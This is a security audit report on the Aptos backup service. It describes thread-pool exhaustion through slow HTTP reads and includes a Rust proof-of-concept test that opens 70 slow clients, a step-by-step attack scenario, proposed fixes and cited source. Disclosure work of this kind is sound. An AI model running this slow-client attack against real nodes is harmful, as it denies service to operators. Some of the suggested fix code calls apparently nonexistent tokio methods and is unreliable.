# Audit Report

## Title
Thread Pool Exhaustion in Backup Service via Slow HTTP Client Attack

## Summary
The backup service's `BytesSender::send_res()` function uses `blocking_send()` within tokio's blocking thread pool, which can be exhausted by attackers sending concurrent slow HTTP requests. This creates a Denial of Service condition preventing legitimate backup operations.

## Finding Description
The backup service exposes several HTTP endpoints for data export. When a request is received, the service spawns a blocking task to handle data streaming [1](#0-0) . Within these blocking tasks, data is sent through an mpsc channel using `blocking_send()` [2](#0-1) .

The critical vulnerability arises from the interaction between:
1. The tokio runtime's limited blocking thread pool (64 threads maximum) [3](#0-2) 
2. The channel's bounded capacity (100 items) [4](#0-3) 
3. The synchronous `blocking_send()` call that blocks threads when the channel is full

**Attack Scenario:**
1. Attacker initiates 64+ concurrent HTTP GET requests to endpoints like `/state_snapshot/{version}`, `/transactions/{start}/{num}`, etc. [5](#0-4) 
2. Each request spawns one blocking task on the limited 64-thread pool
3. Attacker deliberately reads HTTP response data very slowly (1 byte/second, slowloris-style)
4. The channel buffers (100 items) fill rapidly because consumers aren't draining them
5. `blocking_send()` blocks each thread waiting for channel space
6. All 64 blocking threads become stuck waiting indefinitely
7. New blocking operations (legitimate backups, other services) cannot execute
8. The backup service becomes completely unresponsive

This violates the **Resource Limits** invariant - the service fails to enforce proper concurrency limits and allows unbounded resource consumption.

## Impact Explanation
This vulnerability qualifies as **High Severity** per Aptos bug bounty criteria:

- **API crashes**: The backup service API becomes completely unresponsive when the blocking pool is exhausted
- **Validator node slowdowns**: If the backup service shares infrastructure with validator nodes, resource exhaustion can impact validator performance
- **Critical service unavailability**: Backup operations are essential for disaster recovery; their unavailability creates operational risk

The backup service is critical infrastructure for:
- Disaster recovery and state restoration
- State verification and auditing
- Historical data access for indexers and analytics
- Compliance and forensic analysis

Extended unavailability could prevent emergency recovery operations during incidents.

## Likelihood Explanation
**Likelihood: HIGH**

This attack is trivial to execute:
- No authentication or authorization required on backup endpoints
- Standard HTTP slow read attack (well-known technique)
- Requires only 64+ concurrent connections (easily achievable with simple scripts)
- No specialized knowledge of Aptos internals needed
- Attack tools readily available (slowhttptest, custom Python scripts)

The vulnerability will manifest whenever:
- Multiple legitimate slow clients connect simultaneously
- Network conditions cause slow data transfer
- An attacker deliberately exploits it

## Recommendation
Replace `blocking_send()` with an async approach or implement proper timeout and concurrency controls:

**Option 1 (Recommended): Use async operations instead of blocking**
- Remove `spawn_blocking()` wrapper and use async channel operations
- Convert the data iteration logic to async
- Use `send().await` with timeout instead of `blocking_send()`

**Option 2: Add timeout to blocking_send**
```rust
pub fn send_res(&self, item: BytesResult) -> DbResult<()> {
    use std::time::Duration;
    self.bytes_tx
        .blocking_send_timeout(item, Duration::from_secs(30))
        .map_err(|e| AptosDbError::Other(format!("Failed to send to response stream. {e}")))
}
```

**Option 3: Add concurrency limits**
- Implement semaphore-based rate limiting on concurrent backup requests
- Add per-client connection limits
- Implement request timeout at the HTTP layer

**Combined approach (most robust):**
```rust
// Add to utils.rs
static BACKUP_SEMAPHORE: Lazy<Arc<Semaphore>> = Lazy::new(|| {
    Arc::new(Semaphore::new(16)) // Limit to 16 concurrent backups
});

pub(super) fn reply_with_bytes_sender<F>(
    backup_handler: &BackupHandler,
    endpoint: &'static str,
    f: F,
) -> Box<dyn Reply>
where
    F: FnOnce(BackupHandler, &mut bytes_sender::BytesSender) -> DbResult<()> + Send + 'static,
{
    let (sender, stream) = bytes_sender::BytesSender::new(endpoint);
    let bh = backup_handler.clone();
    let sem = BACKUP_SEMAPHORE.clone();
    
    let _join_handle = tokio::task::spawn_blocking(move || {
        let _permit = sem.blocking_acquire().ok()?; // Acquire before processing
        let _timer = BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
        abort_on_error(f)(bh, sender)
    });

    Box::new(Response::new(Body::wrap_stream(stream)))
}
```

## Proof of Concept
```rust
// PoC test demonstrating thread pool exhaustion
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn test_backup_service_thread_pool_exhaustion() {
    use std::sync::Arc;
    use std::time::Duration;
    use tokio::time::sleep;
    use aptos_db::AptosDB;
    use aptos_temppath::TempPath;
    use reqwest;
    
    // Setup backup service
    let tmpdir = TempPath::new();
    let db = Arc::new(AptosDB::new_for_test(&tmpdir));
    let port = 8080;
    let addr = std::net::SocketAddr::from(([127, 0, 0, 1], port));
    let _rt = start_backup_service(addr, db);
    
    sleep(Duration::from_millis(100)).await;
    
    // Launch 64+ slow clients that consume data very slowly
    let mut handles = vec![];
    for i in 0..70 {
        let handle = tokio::spawn(async move {
            let client = reqwest::Client::builder()
                .timeout(Duration::from_secs(300))
                .build()
                .unwrap();
                
            let mut response = client
                .get(format!("http://127.0.0.1:{}/state_snapshot/0", port))
                .send()
                .await
                .unwrap();
            
            // Read very slowly to cause backpressure
            while let Some(chunk) = response.chunk().await.unwrap() {
                println!("Client {} read {} bytes", i, chunk.len());
                sleep(Duration::from_secs(5)).await; // Deliberately slow
            }
        });
        handles.push(handle);
    }
    
    // Allow slow clients to block threads
    sleep(Duration::from_secs(2)).await;
    
    // Try to make a new backup request - this should fail/timeout
    // because all blocking threads are exhausted
    let result = tokio::time::timeout(
        Duration::from_secs(5),
        reqwest::get(format!("http://127.0.0.1:{}/db_state", port))
    ).await;
    
    assert!(result.is_err(), "New request should timeout due to thread pool exhaustion");
    
    // Cleanup
    for handle in handles {
        handle.abort();
    }
}
```

**Notes:**
- The vulnerability exists because `blocking_send()` is called within `spawn_blocking()` tasks, creating nested blocking that can exhaust the limited thread pool
- The channel capacity of 100 items is insufficient to buffer data when consumers are slow
- No rate limiting or concurrent request limits exist at the service level
- The fix requires either moving to fully async operations or implementing proper concurrency controls with timeouts

### Citations

**File:** storage/backup/backup-service/src/handlers/utils.rs (L58-62)
```rust
    let _join_handle = tokio::task::spawn_blocking(move || {
        let _timer =
            BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
        abort_on_error(f)(bh, sender)
    });
```

**File:** storage/backup/backup-service/src/handlers/bytes_sender.rs (L22-31)
```rust
    const MAX_BATCHES: usize = 100;
    #[cfg(not(test))]
    const TARGET_BATCH_SIZE: usize = 10 * 1024;
    #[cfg(test)]
    const TARGET_BATCH_SIZE: usize = 10;

    pub fn new(
        endpoint: &'static str,
    ) -> (Self, tokio_stream::wrappers::ReceiverStream<BytesResult>) {
        let (bytes_tx, bytes_rx) = tokio::sync::mpsc::channel(Self::MAX_BATCHES);
```

**File:** storage/backup/backup-service/src/handlers/bytes_sender.rs (L83-87)
```rust
    pub fn send_res(&self, item: BytesResult) -> DbResult<()> {
        self.bytes_tx
            .blocking_send(item)
            .map_err(|e| AptosDbError::Other(format!("Failed to send to response stream. {e}")))
    }
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L47-110)
```rust
    // GET state_snapshot/<version>
    let bh = backup_handler.clone();
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_item_count/<version>
    let bh = backup_handler.clone();
    let state_item_count = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(
                STATE_ITEM_COUNT,
                &(bh.get_state_item_count(version)? as u64),
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_root_proof/<version>
    let bh = backup_handler.clone();
    let state_root_proof = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(STATE_ROOT_PROOF, &bh.get_state_root_proof(version)?)
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```
